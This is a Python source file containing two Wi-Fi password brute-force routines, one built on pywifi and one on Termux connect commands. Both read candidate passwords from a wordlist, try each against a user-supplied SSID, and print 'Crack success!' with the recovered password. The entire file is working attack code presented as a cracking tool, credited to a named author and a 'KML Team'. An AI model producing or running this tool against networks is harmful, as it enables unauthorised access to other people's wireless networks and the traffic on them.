def WifiBF0(colors):
    import os
    import os.path
    import platform
    import time
    import pywifi
    from pywifi import PyWiFi, const, Profile
    # And pip install comtypes

    # We from KML Team thank Brahim Jarrar for the code

    # By Brahim Jarrar ~
    # GITHUB : https://github.com/BrahimJarrar/ ~
    # CopyRight 2019 ~


    try:
        # wlan
        wifi = PyWiFi()
        ifaces = wifi.interfaces()[0]

        ifaces.scan() #check the card
        results = ifaces.scan_results()


        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
    except:
        print(f"\n[{colors["%>-<%"]}ERROR{colors['%---%']}] Error system")

    type = False

    def main(ssid, password, number):

        profile = Profile() 
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP


        profile.key = password
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        time.sleep(1) # if script not working change time to 1 !!!!!!
        iface.connect(tmp_profile) # trying to Connect
        time.sleep(1) # 1s

        if ifaces.status() == const.IFACE_CONNECTED: # checker
            time.sleep(1)
            print(f'\n[ {colors["%>K<%"]}OK{colors["%---%"]} ] Crack success!')
            print(f'[{colors["%>+<%"]}+{colors["%---%"]}] {ssid} password:', password)
            time.sleep(1)
            exit()
        else:
            print(f'[{colors["%>!<%"]}{number}{colors["%---%"]}] Crack Failed using {password}')

    def pwd(ssid, file):
        number = 0
        with open(file, 'r', encoding='utf8') as words:
            for line in words:
                number += 1
                line = line.split("\n")
                pwd = line[0]
                main(ssid, pwd, number)
                        


    def menu():
        print(f"\n[{colors["%>+<%"]}+{colors["%---%"]}] You are using ", platform.system(), platform.machine(), "...")
        time.sleep(2.5)
        
        ssid = input(">>> Type Wifi name (SSID): ")
        filee = ('terminal_commands\MrPaper.txt')


        if os.path.exists(filee):
            print(f"\n[{colors["%>+<%"]}+{colors["%---%"]}] Cracking...")
            pwd(ssid, filee)

        else:
            print(f"\n[{colors["%>-<%"]}ERROR{colors['%---%']}] No Such File.")

    menu()

def WifiBF():
    import subprocess
    import time
    import json
    
    ssid = str(input(">>> Type the wifi name (SSID):"))

    print(f"[+] Cracking '{ssid}'...")

    with open('terminal_commands\MrPaper.txt', 'r') as f:
        while True:
            line = f.readline()
            if not line:
                break
            passwd = line.strip()

            result = subprocess.run(['termux-wifi-connect', ssid, passwd], capture_output=True, text=True)

            time.sleep(5)

            status = subprocess.run(['termux-wifi-connectioninfo'], capture_output=True, text=True)

            info = json.loads(status.stdout)
            if info.get('supplicant_state') == 'COMPLETED' and info.get('ssid'):
                print("[ OK ] Cracked!")
                print(f"[+] {ssid} password: {passwd}")
                break
